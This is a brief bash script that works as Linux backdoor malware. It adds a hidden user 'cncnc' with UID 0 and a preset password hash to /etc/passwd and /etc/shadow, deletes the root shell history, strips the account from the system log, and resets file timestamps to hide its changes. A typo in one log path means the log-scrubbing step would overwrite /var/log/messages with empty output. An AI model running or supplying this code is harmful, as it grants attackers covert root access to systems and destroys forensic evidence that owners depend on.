#!/bin/bash

pt=$(stat -c %z /etc/passwd)
st=$(stat -c %z /etc/shadow)
mt=$(stat -c %z /var/log/messages)
a=$(grep cncnc /etc/passwd | wc -l)
b=$(grep cncnc /etc/shadow | wc -l)
if [ $a == 0 ]
then
   echo cncnc:x:0:0::/:/bin/bash >> /etc/passwd
fi
if [ $b == 0 ]
then
   echo cncnc:\$1\$UUxfigHX\$CE1GVwN7JbGnafnPsC.0E1:16923:0:99999:7::: >> /etc/shadow
fi

rm /.bash_history
cat /var/log/messags | grep -v cncnc > /lib/libfreebl4.chk
mv /lib/libfreebl4.chk /var/log/messages
touch -m -d "$pt" /etc/passwd
touch -m -d "$st" /etc/shadow
touch -m -d "$mt" /var/log/messages
